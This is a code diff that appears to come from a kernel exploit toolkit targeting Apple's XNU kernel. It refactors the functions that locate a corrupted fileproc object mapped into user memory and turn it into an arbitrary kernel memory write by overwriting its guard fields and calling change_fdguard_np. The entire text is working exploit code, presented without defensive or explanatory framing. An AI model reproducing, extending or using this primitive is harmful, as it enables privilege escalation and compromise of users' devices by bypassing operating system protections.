@@ -33,18 +33,19 @@ void kwrite_dup_allocate(struct kfd* kfd, u64 id)
 
 bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
 {
+    volatile struct fileproc* fp = (volatile struct fileproc*)(object_uaddr);
     i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
 
-    if ((static_uget(fileproc, fp_iocount, object_uaddr) == 1) &&
-        (static_uget(fileproc, fp_vflags, object_uaddr) == 0) &&
-        (static_uget(fileproc, fp_flags, object_uaddr) == 0) &&
-        (static_uget(fileproc, fp_guard_attrs, object_uaddr) == 0) &&
-        (static_uget(fileproc, fp_glob, object_uaddr) > ptr_mask) &&
-        (static_uget(fileproc, fp_guard, object_uaddr) == 0)) {
+    if ((fp->fp_iocount == 1) &&
+        (fp->fp_vflags == 0) &&
+        (fp->fp_flags == 0) &&
+        (fp->fp_guard_attrs == 0) &&
+        (fp->fp_glob > ptr_mask) &&
+        (fp->fp_guard == 0)) {
         for (u64 object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
             assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));
 
-            if (static_uget(fileproc, fp_flags, object_uaddr) == 1) {
+            if (fp->fp_flags == 1) {
                 kfd->kwrite.krkw_object_id = object_id;
                 return true;
             }
@@ -100,6 +101,7 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
     i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
     i32 kwrite_fd = fds[kfd->kwrite.krkw_object_id];
     u64 fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;
+    volatile struct fileproc* fp = (volatile struct fileproc*)(fileproc_uaddr);
 
     const bool allow_retry = false;
 
@@ -116,13 +118,13 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
             break;
         }
 
-        u16 old_fp_guard_attrs = static_uget(fileproc, fp_guard_attrs, fileproc_uaddr);
+        u16 old_fp_guard_attrs = fp->fp_guard_attrs;
         u16 new_fp_guard_attrs = GUARD_REQUIRED;
-        static_uset(fileproc, fp_guard_attrs, fileproc_uaddr, new_fp_guard_attrs);
+        fp->fp_guard_attrs = new_fp_guard_attrs;
 
-        u64 old_fp_guard = static_uget(fileproc, fp_guard, fileproc_uaddr);
-        u64 new_fp_guard = kaddr - static_offsetof(fileproc_guard, fpg_guard);
-        static_uset(fileproc, fp_guard, fileproc_uaddr, new_fp_guard);
+        u64 old_fp_guard = fp->fp_guard;
+        u64 new_fp_guard = kaddr - kfd_offset(fileproc_guard__fpg_guard);
+        fp->fp_guard = new_fp_guard;
 
         u64 guard = old_value;
         u32 guardflags = GUARD_REQUIRED;
@@ -135,8 +137,8 @@ void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
             assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
         }
 
-        static_uset(fileproc, fp_guard_attrs, fileproc_uaddr, old_fp_guard_attrs);
-        static_uset(fileproc, fp_guard, fileproc_uaddr, old_fp_guard);
+        fp->fp_guard_attrs = old_fp_guard_attrs;
+        fp->fp_guard = old_fp_guard;
     } while (allow_retry);
 }
 
